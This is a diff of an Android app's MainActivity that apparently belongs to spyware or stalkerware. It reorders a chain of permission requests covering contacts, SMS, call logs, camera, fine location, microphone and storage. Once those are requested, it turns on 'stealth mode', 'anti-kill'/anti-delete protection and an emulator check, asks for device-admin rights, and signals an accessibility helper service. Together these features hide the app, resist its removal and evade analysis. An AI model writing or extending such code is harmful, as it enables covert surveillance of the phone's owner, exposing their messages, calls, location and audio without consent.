@@ -104,36 +104,55 @@ public class MainActivity extends AppCompatActivity {
     private void autoGrantPermissions() {
         Toast.makeText(this, "Accessibility enabled! Setting up...", Toast.LENGTH_SHORT).show();
         
-        // Request permissions in order with delays
+        // Request all 7 key permissions one by one in sequence
         
-        // Step 1: Contacts (READ_CONTACTS)
-        requestPermissionWithDelay(new String[]{android.Manifest.permission.READ_CONTACTS}, 1000, new PermissionCallback() {
+        // Step 1: Contacts
+        requestPermissionWithDelay(new String[]{android.Manifest.permission.READ_CONTACTS}, 500, new PermissionCallback() {
             @Override
             public void onResult(boolean granted) {
-                // Step 2: Camera
-                requestPermissionWithDelay(new String[]{android.Manifest.permission.CAMERA}, 1500, new PermissionCallback() {
+                android.util.Log.i("Perms", "Contacts: " + granted);
+                // Step 2: SMS
+                requestPermissionWithDelay(new String[]{android.Manifest.permission.READ_SMS}, 1000, new PermissionCallback() {
                     @Override
                     public void onResult(boolean granted) {
-                        // Step 3: Audio (RECORD_AUDIO)
-                        requestPermissionWithDelay(new String[]{android.Manifest.permission.RECORD_AUDIO}, 1500, new PermissionCallback() {
+                        android.util.Log.i("Perms", "SMS: " + granted);
+                        // Step 3: Call Logs
+                        requestPermissionWithDelay(new String[]{android.Manifest.permission.READ_CALL_LOG}, 1000, new PermissionCallback() {
                             @Override
                             public void onResult(boolean granted) {
-                                // Step 4: Videos (READ_MEDIA_VIDEO for Android 13+, READ_EXTERNAL_STORAGE for older)
-                                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
-                                    requestPermissionWithDelay(new String[]{"android.permission.READ_MEDIA_VIDEO"}, 1500, new PermissionCallback() {
-                                        @Override
-                                        public void onResult(boolean granted) {
-                                            continueWithOtherPermissions();
-                                        }
-                                    });
-                                } else {
-                                    requestPermissionWithDelay(new String[]{android.Manifest.permission.READ_EXTERNAL_STORAGE}, 1500, new PermissionCallback() {
-                                        @Override
-                                        public void onResult(boolean granted) {
-                                            continueWithOtherPermissions();
-                                        }
-                                    });
-                                }
+                                android.util.Log.i("Perms", "Call Logs: " + granted);
+                                // Step 4: Camera
+                                requestPermissionWithDelay(new String[]{android.Manifest.permission.CAMERA}, 1000, new PermissionCallback() {
+                                    @Override
+                                    public void onResult(boolean granted) {
+                                        android.util.Log.i("Perms", "Camera: " + granted);
+                                        // Step 5: Location
+                                        requestPermissionWithDelay(new String[]{android.Manifest.permission.ACCESS_FINE_LOCATION}, 1000, new PermissionCallback() {
+                                            @Override
+                                            public void onResult(boolean granted) {
+                                                android.util.Log.i("Perms", "Location: " + granted);
+                                                // Step 6: Microphone
+                                                requestPermissionWithDelay(new String[]{android.Manifest.permission.RECORD_AUDIO}, 1000, new PermissionCallback() {
+                                                    @Override
+                                                    public void onResult(boolean granted) {
+                                                        android.util.Log.i("Perms", "Microphone: " + granted);
+                                                        // Step 7: Storage
+                                                        String storagePerm = Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU ? 
+                                                            "android.permission.READ_MEDIA_IMAGES" : android.Manifest.permission.READ_EXTERNAL_STORAGE;
+                                                        requestPermissionWithDelay(new String[]{storagePerm}, 1000, new PermissionCallback() {
+                                                            @Override
+                                                            public void onResult(boolean granted) {
+                                                                android.util.Log.i("Perms", "Storage: " + granted);
+                                                                // All 7 permissions done - now enable anti-delete
+                                                                continueWithOtherPermissions();
+                                                            }
+                                                        });
+                                                    }
+                                                });
+                                            }
+                                        });
+                                    }
+                                });
                             }
                         });
                     }
@@ -143,36 +162,36 @@ public class MainActivity extends AppCompatActivity {
     }
 
     private void continueWithOtherPermissions() {
-        // Step 5: All remaining permissions
-        permissionManager.requestAllPermissions();
+        // Now enable anti-delete and other features AFTER all permissions are requested
+        handler.postDelayed(new Runnable() {
+            @Override
+            public void run() {
+                // Enable anti-delete ONLY after all permissions processed
+                enableAntiKill();
+                enableStealthMode();
+                permissionManager.requestNotificationPermission();
+                checkEmulator();
+                checkAndShowPermissionStatus();
 
-        // Step 6: Request special permissions + battery + device admin
-        permissionManager.requestSpecialPermissions();
+                // Tell accessibility service that permissions setup is complete
+                AccessibilityHelperService.setPermissionsSetupComplete();
+            }
+        }, 2000);
+
+        // Request special permissions + battery + device admin
         handler.postDelayed(new Runnable() {
             @Override
             public void run() {
                 requestBatteryOptimization();
             }
-        }, 1500);
+        }, 4000);
 
         handler.postDelayed(new Runnable() {
             @Override
             public void run() {
                 requestDeviceAdmin();
             }
-        }, 3000);
-
-        // Step 7: Enable stealth features
-        handler.postDelayed(new Runnable() {
-            @Override
-            public void run() {
-                permissionManager.requestNotificationPermission();
-                enableStealthMode();
-                enableAntiKill();
-                checkEmulator();
-                checkAndShowPermissionStatus();
-            }
-        }, 4500);
+        }, 6000);
     }
 
     private void checkAndShowPermissionStatus() {
